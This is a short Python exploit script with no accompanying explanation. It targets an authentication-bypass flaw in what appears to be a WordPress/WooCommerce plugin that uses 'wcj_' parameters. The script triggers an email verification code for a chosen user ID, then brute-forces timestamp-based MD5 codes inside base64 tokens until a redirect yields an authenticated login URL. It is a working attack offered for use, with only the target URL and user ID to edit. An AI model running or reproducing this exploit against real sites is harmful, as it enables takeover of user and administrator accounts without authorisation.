import base64
import hashlib
import requests
import sys
import time
import urllib.parse


url = 'http://target.example.com' # edit here
user_id = 1 # edit here


count = 5

s = int(time.time())
r = requests.get("%s?wcj_user_id=%s" % (url, user_id))

for i in range(count):
    s = s + i
    s_hash = hashlib.md5(str(s).encode('utf-8')).hexdigest()
    wcj_verify_email_param = base64.b64encode(("{\"id\":\"%s\",\"code\":\"%s\"}" % (user_id, s_hash)).encode()).decode('utf-8')
    auth_url = "%s?wcj_verify_email=%s" % (url, urllib.parse.quote(wcj_verify_email_param))
    print("Check : %s" % auth_url)
    r = requests.get(auth_url, allow_redirects=False)
    print("Status Code : %s" % r.status_code)
    if r.status_code == 302:
        print('----- Authenticated URL ------')
        print(auth_url)
        print('------------------------------')
        break
